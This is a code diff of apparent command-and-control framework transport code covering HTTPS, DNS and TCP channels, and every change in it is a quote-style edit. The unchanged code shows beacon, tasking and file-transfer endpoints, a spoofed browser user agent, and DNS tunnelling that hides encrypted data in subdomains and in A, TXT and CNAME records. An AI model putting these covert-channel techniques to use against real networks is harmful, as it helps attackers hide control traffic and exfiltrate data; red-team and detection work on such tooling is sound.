@@ -55,21 +55,21 @@ class BaseProtocol:
         self.connection_lock = threading.Lock()
         self.message_handlers: Dict[str, Callable] = {}
         self.stats = {
-            'messages_sent': 0,
-            'messages_received': 0,
-            'bytes_sent': 0,
-            'bytes_received': 0,
-            'connection_attempts': 0,
-            'last_activity': 0
+            "messages_sent": 0,
+            "messages_received": 0,
+            "bytes_sent": 0,
+            "bytes_received": 0,
+            "connection_attempts": 0,
+            "last_activity": 0
         }
 
         # Protocol-specific configuration
         self.config = {
-            'timeout': 30,
-            'retry_count': 3,
-            'retry_delay': 1,
-            'buffer_size': 4096,
-            'keep_alive': True
+            "timeout": 30,
+            "retry_count": 3,
+            "retry_delay": 1,
+            "buffer_size": 4096,
+            "keep_alive": True
         }
 
     async def _default_on_connection(self, connection_info: Dict[str, Any]):
@@ -120,17 +120,17 @@ class BaseProtocol:
                 # Store encrypted data for actual transmission
                 # In a real implementation, this would send over the network
                 self._pending_messages.append({
-                    'encrypted_data': encrypted_data,
-                    'message_id': message.get('id', 'unknown'),
-                    'timestamp': time.time(),
-                    'destination': message.get('destination', 'default')
+                    "encrypted_data": encrypted_data,
+                    "message_id": message.get("id", "unknown"),
+                    "timestamp": time.time(),
+                    "destination": message.get("destination", "default")
                 })
 
                 return {
-                    'status': 'success',
-                    'message_id': message.get('id', 'unknown'),
-                    'timestamp': time.time(),
-                    'encrypted_size': len(encrypted_data)
+                    "status": "success",
+                    "message_id": message.get("id", "unknown"),
+                    "timestamp": time.time(),
+                    "encrypted_size": len(encrypted_data)
                 }
             except Exception as e:
                 self.logger.error("Encryption failed: %s", str(e))
@@ -138,9 +138,9 @@ class BaseProtocol:
         else:
             # No encryption - return unencrypted response
             return {
-                'status': 'success',
-                'message_id': message.get('id', 'unknown'),
-                'timestamp': time.time()
+                "status": "success",
+                "message_id": message.get("id", "unknown"),
+                "timestamp": time.time()
             }
 
     async def connect(self) -> bool:
@@ -161,10 +161,10 @@ class BaseProtocol:
 
             # Trigger connection callback
             await self.on_connection({
-                'host': self.host,
-                'port': self.port,
-                'protocol': self.__class__.__name__.lower().replace('protocol', ''),
-                'timestamp': time.time()
+                "host": self.host,
+                "port": self.port,
+                "protocol": self.__class__.__name__.lower().replace("protocol", ""),
+                "timestamp": time.time()
             })
 
             return True
@@ -209,9 +209,9 @@ class HttpsProtocol(BaseProtocol):
 
         # HTTP-specific configuration
         self.config.update({
-            'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'max_redirects': 5,
-            'chunk_size': 8192
+            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "max_redirects": 5,
+            "chunk_size": 8192
         })
 
 
@@ -219,7 +219,7 @@ class HttpsProtocol(BaseProtocol):
         """Create HTTP response, handling missing aiohttp gracefully."""
         if not HAS_AIOHTTP:
             # Return a mock response for testing
-            return {'body': body, 'status': status}
+            return {"body": body, "status": status}
         # Use the globally imported aiohttp
         return aiohttp.web.Response(body=body, status=status)
 
@@ -319,7 +319,7 @@ class HttpsProtocol(BaseProtocol):
             async with self.session.post(
                 f"{base_url}{endpoint}",
                 data=encrypted_data,
-                headers={'Content-Type': 'application/octet-stream'}
+                headers={"Content-Type": "application/octet-stream"}
             ) as response:
                 if response.status == 200:
                     response_data = await response.read()
@@ -333,31 +333,31 @@ class HttpsProtocol(BaseProtocol):
 
     def _get_endpoint_for_message(self, message: Dict[str, Any]) -> str:
         """Get appropriate endpoint based on message type."""
-        msg_type = message.get('type', 'beacon')
+        msg_type = message.get("type", "beacon")
 
-        if msg_type in ['beacon', 'registration']:
-            return '/beacon'
-        elif msg_type in ['task_result', 'command']:
-            return '/task'
-        elif msg_type == 'file_upload':
-            return '/upload'
-        elif msg_type == 'file_download':
-            return '/download'
+        if msg_type in ["beacon", "registration"]:
+            return "/beacon"
+        elif msg_type in ["task_result", "command"]:
+            return "/task"
+        elif msg_type == "file_upload":
+            return "/upload"
+        elif msg_type == "file_download":
+            return "/download"
         else:
-            return '/beacon'
+            return "/beacon"
 
     async def _handle_client_connection(self, reader, writer):
         """Handle incoming client connection."""
         try:
-            client_addr = writer.get_extra_info('peername')
+            client_addr = writer.get_extra_info("peername")
             self.connection_count += 1
             self.logger.debug("Reader stream ready: %s", reader is not None)
 
             try:
                 await self.on_connection({
-                    'remote_addr': client_addr,
-                    'protocol': 'https',
-                    'timestamp': time.time()
+                    "remote_addr": client_addr,
+                    "protocol": "https",
+                    "timestamp": time.time()
                 })
             except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
                 self.logger.error("on_connection callback error: %s", e)
@@ -373,14 +373,14 @@ class HttpsProtocol(BaseProtocol):
             decrypted = self.encryption_manager.decrypt(encrypted_data)
             message = json.loads(decrypted)
 
-            session_id = message.get('session_id', 'unknown')
+            session_id = message.get("session_id", "unknown")
             try:
                 await self.on_message(session_id, message)
             except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
                 self.logger.error("on_message callback error: %s", e)
 
             # Send response
-            response = {'status': 'success', 'timestamp': time.time()}
+            response = {"status": "success", "timestamp": time.time()}
             encrypted_response = self.encryption_manager.encrypt(json.dumps(response))
 
             return self._create_response(body=encrypted_response)
@@ -397,13 +397,13 @@ class HttpsProtocol(BaseProtocol):
             decrypted = self.encryption_manager.decrypt(encrypted_data)
             message = json.loads(decrypted)
 
-            session_id = message.get('session_id', 'unknown')
+            session_id = message.get("session_id", "unknown")
             try:
                 await self.on_message(session_id, message)
             except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
                 self.logger.error("on_message callback error: %s", e)
 
-            response = {'status': 'success', 'timestamp': time.time()}
+            response = {"status": "success", "timestamp": time.time()}
             encrypted_response = self.encryption_manager.encrypt(json.dumps(response))
 
             return self._create_response(body=encrypted_response)
@@ -420,13 +420,13 @@ class HttpsProtocol(BaseProtocol):
             decrypted = self.encryption_manager.decrypt(encrypted_data)
             message = json.loads(decrypted)
 
-            session_id = message.get('session_id', 'unknown')
+            session_id = message.get("session_id", "unknown")
             try:
                 await self.on_message(session_id, message)
             except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
                 self.logger.error("on_message callback error: %s", e)
 
-            response = {'status': 'success', 'timestamp': time.time()}
+            response = {"status": "success", "timestamp": time.time()}
             encrypted_response = self.encryption_manager.encrypt(json.dumps(response))
 
             return self._create_response(body=encrypted_response)
@@ -443,13 +443,13 @@ class HttpsProtocol(BaseProtocol):
             decrypted = self.encryption_manager.decrypt(encrypted_data)
             message = json.loads(decrypted)
 
-            session_id = message.get('session_id', 'unknown')
+            session_id = message.get("session_id", "unknown")
             try:
                 await self.on_message(session_id, message)
             except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
                 self.logger.error("on_message callback error: %s", e)
 
-            response = {'status': 'success', 'timestamp': time.time()}
+            response = {"status": "success", "timestamp": time.time()}
             encrypted_response = self.encryption_manager.encrypt(json.dumps(response))
 
             return self._create_response(body=encrypted_response)
@@ -475,10 +475,10 @@ class DnsProtocol(BaseProtocol):
 
         # DNS-specific configuration
         self.config.update({
-            'query_timeout': 10,
-            'max_label_length': 63,
-            'max_domain_length': 253,
-            'encoding': 'base32'
+            "query_timeout": 10,
+            "max_label_length": 63,
+            "max_domain_length": 253,
+            "encoding": "base32"
         })
 
     async def start(self):
@@ -504,7 +504,7 @@ class DnsProtocol(BaseProtocol):
     async def stop(self):
         """Stop DNS server."""
         try:
-            if hasattr(self, 'socket'):
+            if hasattr(self, "socket"):
                 self.socket.close()
 
             self.connected = False
@@ -523,7 +523,7 @@ class DnsProtocol(BaseProtocol):
             self.socket.settimeout(5)
 
             # Send test query
-            test_query = self._build_dns_query(os.environ.get('DNS_TEST_DOMAIN', 'test.internal'))
+            test_query = self._build_dns_query(os.environ.get("DNS_TEST_DOMAIN", "test.internal"))
             self.socket.sendto(test_query, (self.host, self.port))
 
             response, addr = self.socket.recvfrom(1024)
@@ -539,7 +539,7 @@ class DnsProtocol(BaseProtocol):
 
     async def disconnect(self):
         """Disconnect from DNS server (client mode)."""
-        if hasattr(self, 'socket'):
+        if hasattr(self, "socket"):
             self.socket.close()
         self.connected = False
 
@@ -548,7 +548,7 @@ class DnsProtocol(BaseProtocol):
         try:
             # Encrypt and encode message
             encrypted_data = self.encryption_manager.encrypt(json.dumps(message))
-            encoded_data = base64.b64encode(encrypted_data).decode('utf-8')
+            encoded_data = base64.b64encode(encrypted_data).decode("utf-8")
 
             # Split into DNS query chunks
             chunks = self._split_into_dns_chunks(encoded_data)
@@ -564,8 +564,8 @@ class DnsProtocol(BaseProtocol):
                 if response:
                     parsed_response = self._parse_dns_response(response)
                     response_data = {
-                        'data': parsed_response,
-                        'source_addr': addr
+                        "data": parsed_response,
+                        "source_addr": addr
                     }
                     responses.append(response_data)
 
@@ -587,7 +587,7 @@ class DnsProtocol(BaseProtocol):
         for i in range(0, len(data), max_chunk_size):
             chunk = data[i:i+max_chunk_size]
             # Make DNS-safe by replacing problematic characters
-            chunk = chunk.replace('+', '-').replace('/', '_').replace('=', '')
+            chunk = chunk.replace("+", "-").replace("/", "_").replace("=", "")
             chunks.append(chunk)
         return chunks
 
@@ -604,17 +604,17 @@ class DnsProtocol(BaseProtocol):
         authority_rrs = 0
         additional_rrs = 0
 
-        header = struct.pack('!HHHHHH', transaction_id, flags, questions,
+        header = struct.pack("!HHHHHH", transaction_id, flags, questions,
                            answer_rrs, authority_rrs, additional_rrs)
 
         # Encode domain name
-        qname = b''
-        for part in domain.split('.'):
-            qname += bytes([len(part)]) + part.encode('utf-8')
-        qname += b'\\x00'  # Null terminator
+        qname = b""
+        for part in domain.split("."):
+            qname += bytes([len(part)]) + part.encode("utf-8")
+        qname += b"\\x00"  # Null terminator
 
-        qtype = struct.pack('!H', 1)  # A record
-        qclass = struct.pack('!H', 1)  # IN class
+        qtype = struct.pack("!H", 1)  # A record
+        qclass = struct.pack("!H", 1)  # IN class
 
         return header + qname + qtype + qclass
 
@@ -630,7 +630,7 @@ class DnsProtocol(BaseProtocol):
                 return ""
 
             # Parse DNS header
-            header = struct.unpack('!HHHHHH', response[:12])
+            header = struct.unpack("!HHHHHH", response[:12])
             transaction_id, flags, questions, answer_rrs, authority_rrs, additional_rrs = header
 
             self.logger.debug("DNS Response - ID: %s, Flags: %04x, Answers: %s, Authority: %s, Additional: %s", transaction_id, flags, answer_rrs, authority_rrs, additional_rrs)
@@ -687,7 +687,7 @@ class DnsProtocol(BaseProtocol):
                     break
 
                 # Parse TYPE, CLASS, TTL, RDLENGTH
-                rr_type, rr_class, ttl, rdlength = struct.unpack('!HHIH', response[offset:offset+10])
+                rr_type, rr_class, ttl, rdlength = struct.unpack("!HHIH", response[offset:offset+10])
                 self.logger.debug("RR - Type: %s, Class: %s, TTL: %s, Length: %s", rr_type, rr_class, ttl, rdlength)
                 offset += 10
 
@@ -699,13 +699,13 @@ class DnsProtocol(BaseProtocol):
 
                 if rr_type == 1:  # A record
                     if rdlength == 4:
-                        ip = '.'.join(str(b) for b in rdata)
+                        ip = ".".join(str(b) for b in rdata)
                         self.logger.debug("A record: %s", ip)
 
                         # Try to extract encoded data from IP octets
                         try:
                             # Convert IP octets to base64-encoded string
-                            data_chunk = ''.join(chr(b) for b in rdata if 32 <= b <= 126)
+                            data_chunk = "".join(chr(b) for b in rdata if 32 <= b <= 126)
                             if data_chunk:
                                 extracted_data.append(data_chunk)
                         except Exception:
@@ -721,7 +721,7 @@ class DnsProtocol(BaseProtocol):
                         length = rdata[txt_offset]
                         txt_offset += 1
                         if txt_offset + length <= len(rdata):
-                            txt_chunk = rdata[txt_offset:txt_offset + length].decode('utf-8', errors='ignore')
+                            txt_chunk = rdata[txt_offset:txt_offset + length].decode("utf-8", errors="ignore")
                             txt_data += txt_chunk
                             txt_offset += length
                         else:
@@ -737,18 +737,18 @@ class DnsProtocol(BaseProtocol):
                     if cname:
                         self.logger.debug("CNAME: %s", cname)
                         # Extract data from subdomain part
-                        parts = cname.split('.')
+                        parts = cname.split(".")
                         if len(parts) > 0:
                             data_part = parts[0]
                             # Decode base64-safe characters
-                            data_part = data_part.replace('-', '+').replace('_', '/')
+                            data_part = data_part.replace("-", "+").replace("_", "/")
                             try:
                                 # Pad base64 if needed
                                 missing_padding = len(data_part) % 4
                                 if missing_padding:
-                                    data_part += '=' * (4 - missing_padding)
+                                    data_part += "=" * (4 - missing_padding)
 
-                                decoded = base64.b64decode(data_part).decode('utf-8', errors='ignore')
+                                decoded = base64.b64decode(data_part).decode("utf-8", errors="ignore")
                                 if decoded:
                                     extracted_data.append(decoded)
                             except Exception:
@@ -758,7 +758,7 @@ class DnsProtocol(BaseProtocol):
                 offset += rdlength
 
             # Combine all extracted data
-            result = ''.join(extracted_data)
+            result = "".join(extracted_data)
             self.logger.debug("Extracted %s bytes of data from DNS response", len(result))
 
             return result
@@ -793,13 +793,13 @@ class DnsProtocol(BaseProtocol):
                 else:
                     offset += 1
                     if offset + length <= len(data):
-                        label = data[offset:offset + length].decode('utf-8', errors='ignore')
+                        label = data[offset:offset + length].decode("utf-8", errors="ignore")
                         labels.append(label)
                         offset += length
                     else:
                         break
 
-            return '.'.join(labels)
+            return ".".join(labels)
 
         except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
             self.logger.error("Error parsing domain name: %s", e)
@@ -807,7 +807,7 @@ class DnsProtocol(BaseProtocol):
 
     def _combine_dns_responses(self, responses: List[dict]) -> str:
         """Combine multiple DNS responses into original data."""
-        return ''.join(response.get('data', '') for response in responses if isinstance(response, dict))
+        return "".join(response.get("data", "") for response in responses if isinstance(response, dict))
 
     async def _dns_handler_loop(self):
         """Main DNS packet handling loop."""
@@ -846,7 +846,7 @@ class DnsProtocol(BaseProtocol):
                     try:
                         decrypted = self.encryption_manager.decrypt(base64.b64decode(c2_data))
                         message = json.loads(decrypted)
-                        session_id = message.get('session_id', 'unknown')
+                        session_id = message.get("session_id", "unknown")
                         try:
                             await self.on_message(session_id, message)
                         except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
@@ -878,11 +878,11 @@ class DnsProtocol(BaseProtocol):
                 if offset + length > len(data):
                     break
 
-                part = data[offset:offset + length].decode('utf-8')
+                part = data[offset:offset + length].decode("utf-8")
                 domain_parts.append(part)
                 offset += length
 
-            return '.'.join(domain_parts)
+            return ".".join(domain_parts)
 
         except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
             self.logger.error("Error extracting domain: %s", e)
@@ -893,9 +893,9 @@ class DnsProtocol(BaseProtocol):
         try:
             # Extract subdomain part before our domain
             if self.domain in domain:
-                subdomain = domain.replace(f'.{self.domain}', '')
+                subdomain = domain.replace(f".{self.domain}", "")
                 # Remove chunk identifier if present
-                parts = subdomain.split('.')
+                parts = subdomain.split(".")
                 if len(parts) >= 2:
                     return parts[0]  # First part contains the data
 
@@ -911,20 +911,20 @@ class DnsProtocol(BaseProtocol):
             import struct
 
             # Copy transaction ID from query
-            transaction_id = struct.unpack('!H', query[:2])[0]
+            transaction_id = struct.unpack("!H", query[:2])[0]
 
             # Response flags
             flags = 0x8180  # Standard query response, no error
 
             # Copy question count
-            questions = struct.unpack('!H', query[4:6])[0]
+            questions = struct.unpack("!H", query[4:6])[0]
 
             # Set answer count
             answer_rrs = 1
             authority_rrs = 0
             additional_rrs = 0
 
-            header = struct.pack('!HHHHHH', transaction_id, flags, questions,
+            header = struct.pack("!HHHHHH", transaction_id, flags, questions,
                                answer_rrs, authority_rrs, additional_rrs)
 
             # Copy question section from query (simplified)
@@ -941,12 +941,12 @@ class DnsProtocol(BaseProtocol):
             question_section = query[question_start:question_end]
 
             # Build answer section
-            name_pointer = struct.pack('!H', 0xC00C)  # Pointer to question name
-            answer_type = struct.pack('!H', 1)  # A record
-            answer_class = struct.pack('!H', 1)  # IN class
-            ttl = struct.pack('!I', 300)  # 5 minutes TTL
-            rdlength = struct.pack('!H', 4)  # IPv4 address length
-            rdata = struct.pack('!I', 0x7F000001)  # 127.0.0.1
+            name_pointer = struct.pack("!H", 0xC00C)  # Pointer to question name
+            answer_type = struct.pack("!H", 1)  # A record
+            answer_class = struct.pack("!H", 1)  # IN class
+            ttl = struct.pack("!I", 300)  # 5 minutes TTL
+            rdlength = struct.pack("!H", 4)  # IPv4 address length
+            rdata = struct.pack("!I", 0x7F000001)  # 127.0.0.1
 
             answer_section = name_pointer + answer_type + answer_class + ttl + rdlength + rdata
 
@@ -954,7 +954,7 @@ class DnsProtocol(BaseProtocol):
 
         except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
             self.logger.error("Error building DNS response: %s", e)
-            return b''
+            return b""
 
 
 class TcpProtocol(BaseProtocol):
@@ -972,10 +972,10 @@ class TcpProtocol(BaseProtocol):
 
         # TCP-specific configuration
         self.config.update({
-            'socket_timeout': 30,
-            'listen_backlog': 5,
-            'nodelay': True,
-            'keepalive': True
+            "socket_timeout": 30,
+            "listen_backlog": 5,
+            "nodelay": True,
+            "keepalive": True
         })
 
     async def start(self):
@@ -1050,7 +1050,7 @@ class TcpProtocol(BaseProtocol):
 
             # Frame message (length prefix)
             message_length = len(encrypted_data)
-            frame = message_length.to_bytes(4, byteorder='big') + encrypted_data
+            frame = message_length.to_bytes(4, byteorder="big") + encrypted_data
 
             # Send message
             self.writer.write(frame)
@@ -1058,7 +1058,7 @@ class TcpProtocol(BaseProtocol):
 
             # Read response
             response_length_bytes = await self.reader.readexactly(4)
-            response_length = int.from_bytes(response_length_bytes, byteorder='big')
+            response_length = int.from_bytes(response_length_bytes, byteorder="big")
 
             if response_length > 0:
                 encrypted_response = await self.reader.readexactly(response_length)
@@ -1073,7 +1073,7 @@ class TcpProtocol(BaseProtocol):
     async def _handle_client_connection(self, reader, writer):
         """Handle incoming TCP client connection."""
         try:
-            client_addr = writer.get_extra_info('peername')
+            client_addr = writer.get_extra_info("peername")
             session_id = f"tcp_{client_addr[0]}_{client_addr[1]}_{int(time.time())}"
 
             self.client_connections[session_id] = writer
@@ -1081,10 +1081,10 @@ class TcpProtocol(BaseProtocol):
 
             try:
                 await self.on_connection({
-                    'session_id': session_id,
-                    'remote_addr': client_addr,
-                    'protocol': 'tcp',
-                    'timestamp': time.time()
+                    "session_id": session_id,
+                    "remote_addr": client_addr,
+                    "protocol": "tcp",
+                    "timestamp": time.time()
                 })
             except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
                 self.logger.error("on_connection callback error: %s", e)
@@ -1104,7 +1104,7 @@ class TcpProtocol(BaseProtocol):
             while True:
                 # Read message length
                 length_bytes = await reader.readexactly(4)
-                message_length = int.from_bytes(length_bytes, byteorder='big')
+                message_length = int.from_bytes(length_bytes, byteorder="big")
 
                 if message_length == 0:
                     break
@@ -1122,11 +1122,11 @@ class TcpProtocol(BaseProtocol):
                     self.logger.error("on_message callback error: %s", e)
 
                 # Send acknowledgment
-                ack = {'status': 'success', 'timestamp': time.time()}
+                ack = {"status": "success", "timestamp": time.time()}
                 encrypted_ack = self.encryption_manager.encrypt(json.dumps(ack))
 
                 ack_length = len(encrypted_ack)
-                frame = ack_length.to_bytes(4, byteorder='big') + encrypted_ack
+                frame = ack_length.to_bytes(4, byteorder="big") + encrypted_ack
 
                 writer.write(frame)
                 await writer.drain()
@@ -1140,6 +1140,6 @@ class TcpProtocol(BaseProtocol):
         except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
             self.logger.error("Error handling client messages: %s", e)
             try:
-                await self.on_error('tcp', e)
+                await self.on_error("tcp", e)
             except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as ex:
                 self.logger.error("on_error callback error: %s", ex)
